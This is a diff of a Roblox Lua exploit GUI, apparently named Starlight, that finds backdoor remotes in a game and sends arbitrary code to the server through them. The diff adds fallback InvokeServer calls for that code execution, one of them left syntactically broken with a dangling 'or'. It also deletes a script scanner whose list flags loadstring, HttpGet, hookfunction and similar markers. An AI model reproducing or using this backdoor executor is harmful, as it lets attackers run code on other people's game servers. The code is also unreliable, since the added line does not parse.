@@ -2270,7 +2270,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		task.spawn(function()
 			pcall(function()
 				if isFunction then
-					remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
+					remote:InvokeServer('starlightTSS', payload .. "\nreturn true") or remote:InvokeServer(payload .. "\nreturn true") or 
 				else
 					remote:FireServer(payload)
 				end
@@ -2381,7 +2381,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		elseif remoteFunction then
 			print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
 			pcall(function()
-				remoteFunction:InvokeServer('starlightTSS', code)
+				remoteFunction:InvokeServer('starlightTSS', code) or remote:InvokeServer(code)
 			end)
 		else
 			game.StarterGui:SetCore("SendNotification",{
@@ -2713,64 +2713,3 @@ coroutine.wrap(OHZSZXY_fake_script)()
 coroutine.wrap(LZLXRPZ_fake_script)()
 coroutine.wrap(QOXL_fake_script)()
 
-
-
--- Optimized Script Scanner
-local scannedObjects = {}
-local suspiciousPatterns = {
-    "require%(", "getfenv", "setfenv", "loadstring", "HttpGet", "FireServer",
-    "FireAllClients", "coroutine%.wrap", "getrenv", "hookfunction", "syn%."
-}
-
-local function isSuspicious(source)
-    for _, pattern in ipairs(suspiciousPatterns) do
-        if source:find(pattern) then
-            return true
-        end
-    end
-    return false
-end
-
-local function scanScripts()
-    local allDescendants = game:GetDescendants()
-    local found = {}
-    for _, obj in ipairs(allDescendants) do
-        if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
-            if not scannedObjects[obj] then
-                scannedObjects[obj] = true
-                local src
-                pcall(function() src = obj.Source end)
-                if src and isSuspicious(src) then
-                    table.insert(found, {
-                        Name = obj:GetFullName(),
-                        Class = obj.ClassName,
-                        Snippet = src:sub(1, 100)
-                    })
-                end
-            end
-        end
-    end
-
-    if #found > 0 then
-        print("[SCAN RESULTS] Suspicious scripts found:")
-        for _, result in ipairs(found) do
-            print("- " .. result.Name .. " [" .. result.Class .. "]")
-            print("  Snippet: " .. result.Snippet)
-        end
-    else
-        print("[SCAN RESULTS] No suspicious scripts found.")
-    end
-end
-
--- Optional debounce scan
-local debounce = false
-function runScan()
-    if debounce then return end
-    debounce = true
-    scanScripts()
-    wait(5)
-    debounce = false
-end
-
--- Trigger the scan once on load (optional)
--- runScan()
